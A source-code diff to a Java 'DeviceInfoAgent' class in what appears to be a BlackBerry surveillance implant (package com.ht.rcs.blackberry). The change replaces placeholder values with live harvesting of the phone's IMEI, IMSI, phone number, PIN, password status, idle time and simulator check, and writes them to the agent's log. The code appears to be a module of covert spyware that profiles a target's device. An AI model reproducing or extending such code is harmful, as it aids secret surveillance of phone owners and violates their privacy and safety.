@@ -1,5 +1,9 @@
 package com.ht.rcs.blackberry.agent;
 
+import net.rim.device.api.system.DeviceInfo;
+
+import com.ht.rcs.blackberry.Device;
+
 import com.ht.rcs.blackberry.log.Log;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
@@ -8,10 +12,14 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class DeviceInfoAgent extends Agent {
     static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
 
+    Device device;
+
     public DeviceInfoAgent(int agentStatus) {
         super(AGENT_DEVICE, agentStatus, true);
         Check.asserts(Log.convertTypeLog(this.agentId) == Log.LOGTYPE_DEVICE,
                 "Wrong Conversion");
+
+        device = Device.getInstance();
     }
 
     protected DeviceInfoAgent(int agentStatus, byte[] confParams) {
@@ -28,35 +36,40 @@ public class DeviceInfoAgent extends Agent {
 
         boolean ret = true;
 
-        // Modello
-        String content = "Processor: ARM\n";
-        ret &= log.writeLog(content, false);
+        StringBuffer sb = new StringBuffer();
 
-        content = "Model: 8300\n";
-        ret &= log.writeLog(content, false);
+        // Modello
+        sb.append("Processor: ARM\n");
+        sb.append("Simultator: " + DeviceInfo.isSimulator() + "\n");
+        sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
+        sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
+        sb.append("Pin: " + DeviceInfo.getDeviceId() + "\n");
 
         // Alimentazione
-        content = "Battery: installed\n";
-        ret &= log.writeLog(content, false);
-
-        content = "(On AC Line)\n";
-        ret &= log.writeLog(content, false);
-
-        // RAM
-        content = "RAM: 128MB\n";
-        ret &= log.writeLog(content, false);
+        sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "\n");
+        sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
+        sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
+                + "\n");
+        sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + "\n");
 
         // DISK
-        content = "FLASH: 64MB\nSD: 1GB\n";
-        ret &= log.writeLog(content, false);
+        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + "\n");
 
         // OS Version
-        content = "OS: rim 4.3.0\n";
-        ret &= log.writeLog(content, false);
+        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
 
         // Device
-        content = "IMEI: 123456789012345\nIMSI: 123456789012345\nPhone: +390212345678\n";
-        ret &= log.writeLog(content, true);
+        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
+        sb.append("IMEI: " + device.getImei() + "\n");
+        sb.append("IMSI: " + device.getImsi() + "\n");
+        sb.append("Phone: " + device.getPhoneNumber() + "\n");
+
+        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
+        sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
+        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
+        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
+
+        ret = log.writeLog(sb.toString(), true);
 
         if (ret == false) {
             debug.error("Error writing file");
